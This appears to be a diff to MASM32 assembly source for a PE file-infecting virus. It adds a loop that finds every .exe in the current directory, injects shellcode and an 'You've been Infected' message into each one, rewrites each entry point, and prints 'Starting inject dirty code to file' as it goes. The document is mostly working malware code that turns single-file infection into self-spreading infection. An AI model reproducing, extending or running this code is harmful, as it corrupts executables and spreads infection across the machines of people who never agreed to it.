@@ -17,6 +17,10 @@ include c:\masm32\macros\macros.asm
     errorNotPEFileMsg   db  'This file is not a PEFile', 0Ah, 0
     errorOpenFileMsg   db  'Cannt Open File', 0Ah, 0
     errorFindCodeSectionMsg db  'There are some error when finding for code section', 0
+    errorFindFileMsg db  'There are some error when finding for files in directory', 0
+    startInjectingMessage   db  'Starting inject dirty code to file: ', 0
+    successInjectMsg    db  'Success inject code to file: ', 0
+    endOfLine   db  0Ah,0
 
     infectedMsg db  "You've been Infected", 0
     lenMsg  equ $ - infectedMsg
@@ -40,7 +44,7 @@ include c:\masm32\macros\macros.asm
     lenShellCode    equ $ - shellCode
     lengInject  equ lenShellCode + lenMsg
 
-    filePath    db  '\\Mac\Home\Desktop\SharedWithWindows\TestPEFileInject\BASECALC.EXE', 0
+    ; filePath    db  '\\Mac\Home\Desktop\SharedWithWindows\TestPEFileInject\BASECALC.EXE', 0
     ; filePath    db  'C:\Users\KiDctf\Desktop\TestPEFileInject\c42bdc8fa6c1900c91539c647d8227c1.exe', 0
 
     fileHandle  dd  ?
@@ -62,11 +66,60 @@ include c:\masm32\macros\macros.asm
     addressInfectMsg    dd  ?   ; point to dirty message
 
     lpBuffer    dd  0
+
+    fileExtension db "\*.exe",0
+    slash   db  '\', 0
+    hFind	    dd      ?               ; Handle of find First File and File next file
+    filePathFmt     db      200 dup(?)  ; Format string of file Path
+    filePath    db      200 dup(?)
+    foundData		WIN32_FIND_DATA <>  ; Result of FindFirstFile and FindNextFile
 .code
 
 main:
 
+FindFirstFileInCurrentDirectory:
+    push offset filePathFmt        ; lpBuffer
+    push 100                   ; nBufferLength
+    call GetCurrentDirectory
+
+    push offset fileExtension
+    push offset filePathFmt
+	call lstrcat
+
+    push offset filePath        ; lpBuffer
+    push 100                    ; nBufferLength
+    call GetCurrentDirectory
+
+    push offset foundData         ; lpFindFileData
+    push offset filePathFmt           ; lpFileName
+    call FindFirstFile
+    
+	mov hFind,eax
+    cmp eax, INVALID_HANDLE_VALUE
+    jne notErrorFindFile
+    push offset errorFindFileMsg
+    call StdOut
+
+    push 0
+    call ExitProcess
+	
+    notErrorFindFile:
+    push offset slash
+    push offset filePath
+    call lstrcat
+
+    push offset foundData.cFileName
+    push offset filePath
+    call lstrcat
+
 getFileHandle:
+    push offset startInjectingMessage
+    call StdOut
+    push offset filePath
+    call StdOut
+    push offset endOfLine
+    call StdOut
+
     push 0                              ; hTemplateFile
     push FILE_ATTRIBUTE_NORMAL          ; dwFlagsAndAttributes
     push OPEN_EXISTING                  ; dwCreationDisposition
@@ -326,8 +379,16 @@ ChangeEntryPoint:
     push fileHandle                     ; hFile
     call WriteFile
 
-EverythingOk:
-    jmp closeFileHandle
+successInjectMessage:
+    push offset successInjectMsg
+    call StdOut
+    push offset filePath
+    call StdOut
+    push offset endOfLine
+    call StdOut
+    push fileHandle
+    call CloseHandle
+    jmp FindNextFileInCurrentDirectory
 
 errorOpenFile:
     push offset errorOpenFileMsg
@@ -337,16 +398,42 @@ errorOpenFile:
 errorNotPEFile:
     push offset errorNotPEFileMsg
     call StdOut
+    jmp closeFileHandle
 
 errorFindCodeSection:
     push offset errorFindCodeSectionMsg
     call StdOut
+    jmp closeFileHandle
 
 closeFileHandle:
     push fileHandle
     call CloseHandle
 
-exit:
+FindNextFileInCurrentDirectory:
+    push offset foundData     ; lpFindFileData
+    push hFind              ; hFindFile
+    call FindNextFile
+    test eax, eax
+    je exitProcess
+
+    push offset filePath        ; lpBuffer
+    push 100                    ; nBufferLength
+    call GetCurrentDirectory
+
+    push offset slash
+    push offset filePath
+    call lstrcat
+
+    push offset foundData.cFileName
+    push offset filePath
+    call lstrcat
+
+    jmp getFileHandle
+	
+    push hFind
+	call FindClose
+
+exitProcess:
     push 0
     call ExitProcess
 END main
